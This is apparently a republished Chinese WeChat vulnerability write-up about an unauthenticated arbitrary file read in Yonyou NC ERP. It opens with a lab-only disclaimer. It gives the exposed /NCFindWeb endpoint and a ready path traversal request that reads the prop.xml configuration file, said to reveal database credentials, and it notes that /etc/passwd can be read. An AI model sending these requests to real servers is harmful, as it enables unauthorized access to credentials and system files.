<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/M2Lngaz6Gzj4S7n2_ZZTeA)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4O4dl1Y2a9LqiatyWWqR5TBWaDXM0urygClfibLafuVPWuLTpG6XGf1RlxhKke6Km9ys61OSkRiagzw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

 **文章声明**

  

安全技术类文章仅供参考，此文所提供的信息仅针对漏洞靶场进行渗透，未经授权请勿利用文章中的技术手段对任何计算机系统进行入侵操作。

本文所提供的工具仅用于学习，禁止用于其他目的，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。  

  

一、漏洞描述
------

根据分析，用友 NC 系统存在任意文件读取漏洞，在无需登陆系统的情况下，通过某接口可以直接读取服务器上的任意文件。

二、漏洞复现
------

访问系统首页显示如下

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOqSjHwhvaib5AV4fWRVzwJCibQPhicDK7Brbf7pL21WoeFDicSwNZ3CtRg4MU2U3DpWFRn3GEHFAsJVA/640?wx_fmt=jpeg)

目录、文件泄露接口

```
/NCFindWeb?service=IPreAlertConfigService&filename

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOqSjHwhvaib5AV4fWRVzwJCP45U1UqB98pxy6pf9mlao1GCBiaEPUhPmdskYQntcVJqtJIK8PQgyKA/640?wx_fmt=jpeg)

在某些情况下可以读取利用目录穿越读取 / etc/passwd 等文件。这里以读取默认配置文件为例，可以获取数据库账号、密码等信息  

```
/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOqSjHwhvaib5AV4fWRVzwJCa5wGpJlg8wMOA0wLlqlHBKT4d4glXpul9abQv0nwMAFmAaredBgLSg/640?wx_fmt=jpeg)